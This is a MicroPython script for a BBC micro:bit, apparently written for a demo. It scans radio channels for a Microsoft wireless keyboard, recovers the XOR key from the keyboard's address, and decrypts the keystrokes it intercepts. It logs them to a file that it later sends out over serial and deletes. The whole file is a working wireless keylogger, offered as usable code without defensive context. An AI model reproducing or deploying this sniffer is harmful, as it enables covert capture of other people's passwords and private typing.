from microbit import *
import radio
import os

# Not complete, but enough for the demo =)
KEYMAP = [
    '',
    '',
    '',
    '',
    'Q',
    'B',
    'C',
    'D',
    'E',
    'F',
    'G',
    'H',
    'I',
    'J',
    'K',
    'L',
    ',',
    'N',
    'O',
    'P',
    'A',
    'R',
    'S',
    'T',
    'U',
    'V',
    'Z',
    'X',
    'Y',
    'W',
    '1',
    '2',
    '3',
    '4',
    '5',
    '6',
    '7',
    '8',
    '9',
    '0',
    '\r\n',
    '',
    '',
    ' ',
    ' ',
    '',
    '',
    '',
    '',
    '',
    '',
    'M',
    '',
    '',
    '',

]

keybd = None
channel = 1

def progress(v):
    display.clear()
    if (v<5):
        x = v
        y = 0
    elif (v>=5 and v<9):
        x = 4
        y = v-4
    elif (v>=9 and v<13):
        y = 4
        x = 13 - v - 1
    else:
        x = 0
        y = 16 - v
    display.set_pixel(x,y,6)

# init radio sniffer
display.on()
radio.on()
radio.config(data_rate=radio.RATE_2MBIT, channel=channel)


def decrypt(d,k):
    o=[]
    for i in range(len(d)):
        o.append(d[i]^k[i%5])
    return o

# Find a MS wireless keyboard
while True:
    radio.sniff_on()
    p = 0
    timeout = 100
    last = running_time()
    while keybd is None:
        # look for a MS wireless keyboard
        now = running_time()
        if (now - last) > timeout:
            last = now
            channel += 1
            if channel > 81:
                channel = 3

            # display progress
            p += 1
            if p>15:
                p = 0
            progress(p)

            # select channel
            radio.config(channel=channel)

        # Process sniffed ESB packets
        pkt = radio.sniff()
        if pkt is not None:
            if len(pkt)>7 and pkt[5] == 0x0A and pkt[6] == 0x78:
                # keyboard found, keep channel and memorize address
                keybd = pkt[:5]
                display.show(Image.HAPPY)
                sleep(1000)

    # reconfigure keyboard
    display.clear()
    addr = keybd[0]<<24 | keybd[1]<<16 | keybd[2]<<8 | keybd[3]
    gr = keybd[4]
    key = [keybd[4], keybd[3], keybd[2], keybd[1], keybd[0]]
    radio.config(data_rate=radio.RATE_2MBIT, channel=channel, address=addr, group=gr, queue=20)
    radio.esb()
    lk = None
    lp = None
    last_seq = 0
    with open('keys.txt','w') as log:
        while True:
            # loop if button A or B is pressed
            if button_a.is_pressed():
                log.close()
                display.show(Image.YES)
                while True:
                    if uart.any():
                        f = open('keys.txt','r')
                        uart.write(f.read())
                        f.close()
                        os.remove('keys.txt')
                        while True:
                            pass

            # Process sniffed ESB packets
            pkt = radio.receive_bytes()
            if pkt is not None:
                if len(pkt)>9 and pkt[0] == 0x0A and pkt[1] == 0x78 and (last_seq != ((pkt[5] << 8) + pkt[4])):
                    last_seq = (pkt[5] << 8) + pkt[4]
                    if pkt != lp:
                        # process key:
                        hids = (pkt[9] ^ key[0], pkt[10] ^ key[1], pkt[11] ^ key[2])
                        if hids[2] != 0:
                            hid = hids[2]
                        elif hids[1] != 0:
                            hid = hids[1]
                        else:
                            hid = hids[0]
                        if hid < len(KEYMAP):
                            log.write(KEYMAP[hid])
                        lp = pkt
